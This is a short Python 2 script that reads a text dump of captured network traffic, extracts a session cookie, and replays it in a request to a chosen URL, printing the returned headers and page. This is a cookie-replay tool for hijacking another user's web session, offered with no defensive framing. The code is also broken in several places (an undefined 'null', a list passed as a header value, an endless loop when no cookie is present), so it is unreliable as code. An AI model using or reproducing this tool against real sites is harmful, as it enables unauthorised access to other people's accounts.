#!/usr/bin/python
import sys
import urllib2
import re
import requests
import cookielib

def main():
	for arg in sys.argv[1:3]:
		if ".txt" in sys.argv[1]:
			text = sys.argv[1]
		if "http://" in sys.argv[2]:
			req_url = sys.argv[2]
	print build_html(parse_pcap(text), req_url)

def parse_pcap(text):
	f = open(text)
	while True:
		reader = f.readline()
		if 'Cookie' in reader:
			reader = reader.replace('\r', '')
			cookie = re.findall(r'(?:\s+|$)[a-zA-Z].*', reader)
			print cookie
			return cookie
			break
	return null

def build_html(cookie, url):
	opener = urllib2.build_opener()
	opener.addheaders.append(('Cookie', cookie))
	response = opener.open(url)
	html = response.read()
	print response.info().headers
	return html

if __name__ == "__main__":
	main()